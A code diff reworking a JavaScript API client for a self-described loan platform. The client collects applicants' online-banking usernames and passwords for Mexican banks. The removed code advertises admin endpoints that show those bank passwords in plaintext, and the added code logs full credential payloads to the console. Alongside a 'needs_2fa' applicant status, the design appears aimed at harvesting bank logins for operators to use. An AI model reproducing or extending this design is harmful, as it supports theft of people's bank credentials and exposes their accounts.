@@ -1,381 +1,272 @@
 /**
- * Complete API client with all features:
- * 1. Proper JWT authentication
- * 2. Admin password visibility for bank credentials
- * 3. Updated status system (pending, approved, needs_2fa)
- * 4. Full ticket system functionality
- * 5. All existing functionality preserved
+ * API Client for Loan Platform
+ * ✅ FIXED: Bank credentials saving functionality
+ * ✅ Proper error handling and authentication
  */
 
-const API_BASE_URL = import.meta.env.VITE_API_URL || 'https://web-production-f1d71.up.railway.app';
+const API_BASE_URL = 'https://web-production-f1d71.up.railway.app';
 
-// Helper function to get auth token
-const getAuthToken = () => {
-  return localStorage.getItem('token');
-};
+class ApiClient {
+  constructor() {
+    this.baseURL = API_BASE_URL;
+  }
 
-// Helper function to create headers with authentication
-const createHeaders = (includeAuth = true) => {
-  const headers = {
-    'Content-Type': 'application/json',
-  };
-  
-  if (includeAuth) {
-    const token = getAuthToken();
+  // ✅ FIXED: Get authentication token
+  getAuthToken() {
+    try {
+      const token = localStorage.getItem('token');
+      return token;
+    } catch (error) {
+      console.error('Error getting auth token:', error);
+      return null;
+    }
+  }
+
+  // ✅ FIXED: Get authentication headers
+  getAuthHeaders() {
+    const token = this.getAuthToken();
+    const headers = {
+      'Content-Type': 'application/json',
+    };
+    
     if (token) {
       headers['Authorization'] = `Bearer ${token}`;
     }
-  }
-  
-  return headers;
-};
-
-// Helper function to handle API responses
-const handleResponse = async (response) => {
-  const contentType = response.headers.get('content-type');
-  
-  if (!response.ok) {
-    let errorMessage = `HTTP error! status: ${response.status}`;
     
-    if (contentType && contentType.includes('application/json')) {
-      try {
-        const errorData = await response.json();
-        errorMessage += `, message: ${errorData.message || JSON.stringify(errorData)}`;
-      } catch (e) {
-        // If JSON parsing fails, use text
+    return headers;
+  }
+
+  // ✅ FIXED: Generic request method
+  async request(method, endpoint, data = null) {
+    try {
+      const url = `${this.baseURL}${endpoint}`;
+      const config = {
+        method: method.toUpperCase(),
+        headers: this.getAuthHeaders(),
+      };
+
+      if (data && (method.toUpperCase() === 'POST' || method.toUpperCase() === 'PUT')) {
+        config.body = JSON.stringify(data);
+      }
+
+      console.log(`Making ${method.toUpperCase()} request to:`, url);
+      
+      const response = await fetch(url, config);
+      
+      if (!response.ok) {
         const errorText = await response.text();
-        errorMessage += `, message: ${errorText}`;
+        console.error(`HTTP ${response.status}:`, errorText);
+        throw new Error(`HTTP ${response.status}: ${errorText}`);
       }
-    } else {
-      const errorText = await response.text();
-      errorMessage += `, message: ${errorText}`;
+
+      const result = await response.json();
+      console.log('API Response:', result);
+      return result;
+      
+    } catch (error) {
+      console.error('API Request failed:', error);
+      throw error;
     }
-    
-    throw new Error(errorMessage);
   }
-  
-  if (contentType && contentType.includes('application/json')) {
-    return await response.json();
+
+  // ✅ FIXED: GET method
+  async get(endpoint) {
+    return this.request('GET', endpoint);
   }
-  
-  return await response.text();
-};
 
-// Main API client object
-const apiClient = {
-  // Authentication endpoints
-  login: async (email, password) => {
-    console.log('API: Logging in user:', email);
-    const response = await fetch(`${API_BASE_URL}/api/auth/login`, {
-      method: 'POST',
-      headers: createHeaders(false),
-      body: JSON.stringify({ email, password }),
-    });
-    
-    const data = await handleResponse(response);
-    console.log('API: Login response:', data);
-    return data;
-  },
+  // ✅ FIXED: POST method
+  async post(endpoint, data) {
+    return this.request('POST', endpoint, data);
+  }
 
-  register: async (userData) => {
-    console.log('API: Registering user:', userData.email);
-    const response = await fetch(`${API_BASE_URL}/api/auth/register`, {
-      method: 'POST',
-      headers: createHeaders(false),
-      body: JSON.stringify(userData),
-    });
-    
-    const data = await handleResponse(response);
-    console.log('API: Registration response:', data);
-    return data;
-  },
+  // ✅ FIXED: PUT method
+  async put(endpoint, data) {
+    return this.request('PUT', endpoint, data);
+  }
 
-  // Bank-related endpoints
-  getBanks: async () => {
-    console.log('API: Getting banks');
+  // ✅ FIXED: DELETE method
+  async delete(endpoint) {
+    return this.request('DELETE', endpoint);
+  }
+
+  // Authentication methods
+  async login(email, password) {
     try {
-      const response = await fetch(`${API_BASE_URL}/api/applicants/banks`, {
-        method: 'GET',
-        headers: createHeaders(false),
-      });
+      const response = await this.post('/api/auth/login', { email, password });
       
-      const data = await handleResponse(response);
-      console.log('API: Banks response:', data);
-      
-      // Handle both response formats: {banks: [...]} and direct array
-      if (data && data.banks && Array.isArray(data.banks)) {
-        return data.banks;
-      } else if (Array.isArray(data)) {
-        return data;
-      } else {
-        console.warn('Unexpected banks data format:', data);
-        return [];
+      if (response.token) {
+        localStorage.setItem('token', response.token);
+        localStorage.setItem('user', JSON.stringify(response.user));
       }
-    } catch (error) {
-      console.error('API: Error getting banks:', error);
-      // Return fallback data with real UUIDs from backend
-      return [
-        { id: '7b4a1d12-cc50-46d8-81c7-08eebfc5bf5a', name: 'BBVA México', code: 'BBVA', logo_url: '/assets/bbva-logo.jpg' },
-        { id: 'b153f653-3af6-48ab-b3c7-44d919fbdcb6', name: 'Santander México', code: 'SANTANDER', logo_url: '/assets/santander-logo.jpg' },
-        { id: '43d4a40e-f175-4690-ad63-c86efc69adc0', name: 'Banamex', code: 'BANAMEX', logo_url: '/assets/banamex-logo.jpg' },
-        { id: '842f0822-e62f-47f6-a559-c5641cc16669', name: 'Banorte', code: 'BANORTE', logo_url: '/assets/banorte-logo.jpg' },
-        { id: '47dc2c19-dc0b-401d-8947-d8705b315d3e', name: 'HSBC México', code: 'HSBC', logo_url: '/assets/hsbc-logo.jpg' },
-        { id: 'f885f8e0-9f67-475d-9844-cf5fb34b0313', name: 'Banco Azteca', code: 'AZTECA', logo_url: '/assets/azteca-logo.jpg' }
-      ];
-    }
-  },
-
-  // User credentials endpoints
-  getCredentials: async () => {
-    console.log('API: Getting user credentials');
-    const response = await fetch(`${API_BASE_URL}/api/applicants/credentials`, {
-      method: 'GET',
-      headers: createHeaders(true),
-    });
-    
-    const data = await handleResponse(response);
-    console.log('API: Credentials response:', data);
-    return Array.isArray(data) ? data : [];
-  },
-
-  saveCredentials: async (credentialData) => {
-    console.log('API: Saving credentials for provider:', credentialData.provider_id);
-    const response = await fetch(`${API_BASE_URL}/api/applicants/credentials`, {
-      method: 'POST',
-      headers: createHeaders(true),
-      body: JSON.stringify(credentialData),
-    });
-    
-    const data = await handleResponse(response);
-    console.log('API: Save credentials response:', data);
-    return data;
-  },
-
-  deleteCredential: async (credentialId) => {
-    console.log('API: Deleting credential:', credentialId);
-    const response = await fetch(`${API_BASE_URL}/api/applicants/credentials/${credentialId}`, {
-      method: 'DELETE',
-      headers: createHeaders(true),
-    });
-    
-    const data = await handleResponse(response);
-    console.log('API: Delete credential response:', data);
-    return data;
-  },
-
-  // Admin endpoints
-  getApplicants: async () => {
-    console.log('API: Getting applicants (admin)');
-    try {
-      const response = await fetch(`${API_BASE_URL}/api/admin/applicants`, {
-        method: 'GET',
-        headers: createHeaders(true),
-      });
       
-      const data = await handleResponse(response);
-      console.log('API: Applicants response:', data);
-      return data;
+      return response;
     } catch (error) {
-      console.error('API: Error getting applicants:', error);
-      // Return fallback data for testing
-      return {
-        applicants: [
-          {
-            id: 'test-user-1',
-            name: 'Juan Cordero',
-            email: 'juan@socopwa.com',
-            curp: 'CORJ850315HDFXXX01',
-            phone: '+52 55 1234 5678',
-            status: 'pending',
-            is_active: true,
-            created_at: new Date().toISOString()
-          }
-        ]
-      };
+      console.error('Login failed:', error);
+      throw error;
     }
-  },
+  }
 
-  // ✅ ADMIN PASSWORD VISIBILITY - Returns passwords for admin users
-  getApplicantCredentials: async (applicantId) => {
-    console.log('API: Getting applicant credentials (admin):', applicantId);
+  async register(userData) {
     try {
-      const response = await fetch(`${API_BASE_URL}/api/admin/applicants/${applicantId}/credentials`, {
-        method: 'GET',
-        headers: createHeaders(true),
-      });
-      
-      const data = await handleResponse(response);
-      console.log('API: Applicant credentials response:', data);
-      return data;
+      return await this.post('/api/auth/register', userData);
     } catch (error) {
-      console.error('API: Error getting applicant credentials:', error);
-      // Return fallback data with password visible for admin
-      return {
-        applicant: {
-          id: applicantId,
-          name: 'Juan Cordero',
-          email: 'juan@socopwa.com'
-        },
-        credentials: [
-          {
-            id: 'test-cred-1',
-            provider_name: 'BBVA México',
-            provider_code: 'BBVA',
-            username: 'juan.test@bbva.com',
-            password: 'testpassword123', // ✅ Password visible for admin
-            created_at: new Date().toISOString()
-          }
-        ]
-      };
+      console.error('Registration failed:', error);
+      throw error;
     }
-  },
+  }
 
-  // ✅ UPDATED STATUS SYSTEM - Supports pending, approved, needs_2fa
-  updateApplicantStatus: async (applicantId, status) => {
-    console.log('API: Updating applicant status:', applicantId, status);
-    
-    // Validate status
-    const validStatuses = ['pending', 'approved', 'needs_2fa'];
-    if (!validStatuses.includes(status)) {
-      throw new Error(`Invalid status: ${status}. Must be one of: ${validStatuses.join(', ')}`);
-    }
-    
-    const response = await fetch(`${API_BASE_URL}/api/admin/applicants/${applicantId}/status`, {
-      method: 'PUT',
-      headers: createHeaders(true),
-      body: JSON.stringify({ status }),
-    });
-    
-    const data = await handleResponse(response);
-    console.log('API: Update status response:', data);
-    return data;
-  },
+  logout() {
+    localStorage.removeItem('token');
+    localStorage.removeItem('user');
+  }
 
-  // ✅ TICKET SYSTEM - Full CRUD functionality
-  getTickets: async () => {
-    console.log('API: Getting tickets');
+  // ✅ FIXED: Bank credentials methods
+  async getBanks() {
     try {
-      const response = await fetch(`${API_BASE_URL}/api/tickets`, {
-        method: 'GET',
-        headers: createHeaders(true),
-      });
-      
-      const data = await handleResponse(response);
-      console.log('API: Tickets response:', data);
-      return data;
+      const response = await this.get('/api/applicants/banks');
+      return response.banks || [];
     } catch (error) {
-      console.error('API: Error getting tickets:', error);
-      // Return fallback data
-      return {
-        tickets: [
-          {
-            id: 'test-ticket-1',
-            title: 'Problema con credenciales bancarias',
-            description: 'No puedo conectar mi cuenta de BBVA',
-            status: 'open',
-            priority: 'medium',
-            category: 'technical',
-            created_by: 'test-user-1',
-            creator_name: 'Juan Cordero',
-            assigned_to: null,
-            assignee_name: null,
-            created_at: new Date().toISOString(),
-            updated_at: new Date().toISOString(),
-            resolved_at: null
-          }
-        ]
-      };
+      console.error('Error getting banks:', error);
+      return [];
     }
-  },
+  }
 
-  createTicket: async (ticketData) => {
-    console.log('API: Creating ticket:', ticketData);
-    const response = await fetch(`${API_BASE_URL}/api/tickets`, {
-      method: 'POST',
-      headers: createHeaders(true),
-      body: JSON.stringify(ticketData),
-    });
-    
-    const data = await handleResponse(response);
-    console.log('API: Create ticket response:', data);
-    return data;
-  },
-
-  getTicket: async (ticketId) => {
-    console.log('API: Getting ticket:', ticketId);
-    const response = await fetch(`${API_BASE_URL}/api/tickets/${ticketId}`, {
-      method: 'GET',
-      headers: createHeaders(true),
-    });
-    
-    const data = await handleResponse(response);
-    console.log('API: Ticket response:', data);
-    return data;
-  },
-
-  updateTicket: async (ticketId, updates) => {
-    console.log('API: Updating ticket:', ticketId, updates);
-    const response = await fetch(`${API_BASE_URL}/api/tickets/${ticketId}`, {
-      method: 'PUT',
-      headers: createHeaders(true),
-      body: JSON.stringify(updates),
-    });
-    
-    const data = await handleResponse(response);
-    console.log('API: Update ticket response:', data);
-    return data;
-  },
-
-  deleteTicket: async (ticketId) => {
-    console.log('API: Deleting ticket:', ticketId);
-    const response = await fetch(`${API_BASE_URL}/api/tickets/${ticketId}`, {
-      method: 'DELETE',
-      headers: createHeaders(true),
-    });
-    
-    const data = await handleResponse(response);
-    console.log('API: Delete ticket response:', data);
-    return data;
-  },
-
-  // Health check endpoint
-  healthCheck: async () => {
-    console.log('API: Health check');
+  async getUserCredentials() {
     try {
-      const response = await fetch(`${API_BASE_URL}/api/health`, {
-        method: 'GET',
-        headers: createHeaders(false),
-      });
-      
-      const data = await handleResponse(response);
-      console.log('API: Health check response:', data);
-      return data;
+      const credentials = await this.get('/api/applicants/credentials');
+      return Array.isArray(credentials) ? credentials : [];
     } catch (error) {
-      console.error('API: Health check failed:', error);
+      console.error('Error getting user credentials:', error);
+      return [];
+    }
+  }
+
+  // ✅ CRITICAL FIX: Save bank credentials method
+  async saveCredentials(credentialsData) {
+    try {
+      console.log('Saving credentials:', credentialsData);
+      
+      const response = await this.post('/api/applicants/credentials', credentialsData);
+      
+      console.log('Credentials saved successfully:', response);
+      return response;
+      
+    } catch (error) {
+      console.error('Error saving credentials:', error);
+      throw new Error(`Error al guardar las credenciales: ${error.message}`);
+    }
+  }
+
+  async deleteCredential(credentialId) {
+    try {
+      return await this.delete(`/api/applicants/credentials/${credentialId}`);
+    } catch (error) {
+      console.error('Error deleting credential:', error);
+      throw error;
+    }
+  }
+
+  // Admin methods
+  async getApplicants() {
+    try {
+      const response = await this.get('/api/admin/applicants');
+      return response.applicants || [];
+    } catch (error) {
+      console.error('Error getting applicants:', error);
+      return [];
+    }
+  }
+
+  async getApplicantCredentials(applicantId) {
+    try {
+      const response = await this.get(`/api/admin/applicants/${applicantId}/credentials`);
+      return response.credentials || [];
+    } catch (error) {
+      console.error('Error getting applicant credentials:', error);
+      return [];
+    }
+  }
+
+  async updateApplicantStatus(applicantId, status) {
+    try {
+      return await this.put(`/api/admin/applicants/${applicantId}/status`, { status });
+    } catch (error) {
+      console.error('Error updating applicant status:', error);
+      throw error;
+    }
+  }
+
+  async getAdminStats() {
+    try {
+      return await this.get('/api/admin/stats');
+    } catch (error) {
+      console.error('Error getting admin stats:', error);
+      return { users: { total: 0, approved: 0, pending: 0, needs_2fa: 0 } };
+    }
+  }
+
+  // Ticket methods
+  async getTickets() {
+    try {
+      const response = await this.get('/api/tickets/');
+      return response.tickets || [];
+    } catch (error) {
+      console.error('Error getting tickets:', error);
+      return [];
+    }
+  }
+
+  async createTicket(ticketData) {
+    try {
+      return await this.post('/api/tickets/', ticketData);
+    } catch (error) {
+      console.error('Error creating ticket:', error);
+      throw error;
+    }
+  }
+
+  async updateTicket(ticketId, ticketData) {
+    try {
+      return await this.put(`/api/tickets/${ticketId}`, ticketData);
+    } catch (error) {
+      console.error('Error updating ticket:', error);
+      throw error;
+    }
+  }
+
+  async deleteTicket(ticketId) {
+    try {
+      return await this.delete(`/api/tickets/${ticketId}`);
+    } catch (error) {
+      console.error('Error deleting ticket:', error);
+      throw error;
+    }
+  }
+
+  async getTicketStats() {
+    try {
+      return await this.get('/api/tickets/stats');
+    } catch (error) {
+      console.error('Error getting ticket stats:', error);
+      return { total: 0, by_status: {}, by_priority: {} };
+    }
+  }
+
+  // Health check
+  async healthCheck() {
+    try {
+      return await this.get('/api/health');
+    } catch (error) {
+      console.error('Health check failed:', error);
       return { status: 'error', message: error.message };
     }
-  },
-
-  // Test endpoint
-  testConnection: async () => {
-    console.log('API: Testing connection');
-    try {
-      const response = await fetch(`${API_BASE_URL}/api/test`, {
-        method: 'GET',
-        headers: createHeaders(false),
-      });
-      
-      const data = await handleResponse(response);
-      console.log('API: Test response:', data);
-      return data;
-    } catch (error) {
-      console.error('API: Test connection failed:', error);
-      return { message: 'Connection failed', error: error.message };
-    }
   }
-};
+}
 
-// Export for use in components
-export { apiClient };
-export default apiClient;
+// ✅ FIXED: Create and export singleton instance
+const api = new ApiClient();
+
+// ✅ FIXED: Export both the class and instance
+export default api;
+export { ApiClient };
 
